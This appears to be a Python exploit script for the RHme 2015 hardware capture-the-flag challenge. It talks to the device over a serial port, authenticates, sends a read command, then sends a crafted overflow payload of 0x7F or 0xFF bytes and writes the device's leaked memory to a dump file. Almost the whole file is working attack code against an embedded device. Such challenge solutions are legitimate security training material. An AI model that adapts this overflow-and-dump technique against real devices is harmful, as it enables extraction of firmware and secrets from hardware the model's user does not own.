#!/usr/bin/env python

from rhme_utilities import *

#---------------------------------------
#   Implementation
#---------------------------------------

# Change this to configure the script
payloadLength = 22
fillChar = '\xFF'
useCustom = True
firstPart = '\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F'
configPart = '\x00\x00\x00'
fillPart = fillChar
for fill in range(0, 1):
	fillPart += fillChar
customCommand = firstPart + configPart + crlf

# Info and Style
print("")
print("-------------------- RHme 2015 Dumper --------------------")
print("")

# Define Main
def main():
	# Flush serial
	Serial_Flush()
	
	# Reach desired state
	# Authenticate
	sendCommand = "A" + crlf
	serialPort.write(sendCommand.encode())
	temp = serialPort.readline()
	print(temp.decode())
	temp = serialPort.readline()
	temp = serialPort.readline()
	print(temp.decode())

	sendCommand = "R00063B4C" + crlf
	serialPort.write(sendCommand.encode())
	# Flush Serial
	for f in range(0, 2):
		temp = serialPort.readline()
		print(temp.decode())

	# Request reading
	sendCommand = "R" + crlf
	serialPort.write(sendCommand.encode())
	temp = serialPort.readline()

	# Perform overflow
	if useCustom == True:
		sendCommand = customCommand
	else:
		sendCommand = fillChar
		for fill in range(1, payloadLength):
			sendCommand += fillChar
		sendCommand += crlf
	serialPort.write(sendCommand.encode())
	# Flush Serial
	for f in range(0, 4):
		temp = serialPort.readline()

	# Dump everything
	dump = open(r"dumps/dump", "wb")
	temp = serialPort.read()
	while temp != b'':
		dump.write(temp)
		temp = serialPort.read()
	print("--- Memory Dumped ---")
	dump.close()

	print("Job's done!")

# Run Main
if __name__ == '__main__':
    main()
